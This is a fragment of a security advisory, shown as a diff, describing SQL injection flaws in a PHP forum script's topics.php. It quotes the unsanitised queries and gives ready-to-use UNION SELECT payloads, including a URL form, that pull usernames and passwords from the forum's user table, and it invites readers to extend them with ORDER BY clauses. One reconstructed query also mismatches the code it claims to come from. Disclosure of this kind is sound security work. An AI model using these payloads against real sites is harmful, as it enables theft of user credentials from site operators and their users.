@@ -1,0 +1,50 @@
+1)
+
+vulnerable code:
+
+$sql = &quot;SELECT forum FROM graffiti_forums WHERE id=$f&quot;;
+$result = mysql_query($sql);
+$sql_row = mysql_fetch_row($result);
+$forum_title = $sql_row[0];
+[...]
+==[ end topics.php ]==========================
+
+How we can see there&#039;s no protection for the using of simple quotes in the sql query. Also we have to say that the script
+doesn&#039;t work with register_globals off.
+
+In this way, we can put in the $f variable something like that
+2 UNION SELECT password as forum FROM graffiti_users
+
+So the sql query looks like this:
+
+SELECT forum FROM graffiti_forums WHERE id=2 UNION SELECT password as forum FROM graffiti_users
+?
+Here, 2 is a valid forum id. Using some ORDER BY clauses you can get differents things... check it out.
+
+2)
+==[ topics.php 21-32 ]==========================
+[...]
+if (!$option){
+        $sql = &quot;SELECT id, topic FROM graffiti_topics WHERE id_forum=&quot; . $f;
+        if ($result = mysql_query($sql)){
+                echo(&quot;&lt;center&gt;&lt;table width=400 border=1&gt;&quot;);
+                while ($sql_row = mysql_fetch_row($result)){
+                        echo(&quot;&lt;tr&gt;&quot;);
+                        echo(&quot;&lt;td&gt;&quot;);
+                        $id = $sql_row[0];
+                        $topic = $sql_row[1];
+                        echo(&quot;&lt;font face=&#039;Arial&#039; size=3&gt;&quot;);
+                        echo(&quot;&lt;img src=&#039;./graphics/paper.gif&#039; border=0&gt; &amp;nbsp;&lt;a href=&#039;messages.php?t=$id&amp;f=$f&#039;&gt;$topic&lt;/a&gt;&quot;);
+                        echo(&quot;&lt;/font&gt;&quot;);
+[...]
+==[ end topics.php ]==========================
+
+In the SQL query of this code we can see the same bug. The explotation is very similar that the other:
+
+topics.php?f=2 UNION SELECT password as topic, username as id FROM graffiti_users
+
+The final sql query looks like this:
+
+SELECT forum FROM graffiti_forums WHERE id=2 UNION SELECT password as topic, username as id FROM graffiti_users
+
+Here, 2 is a valid forum id. Another time you can play with some ORDER BY or GROUP BY clauses.
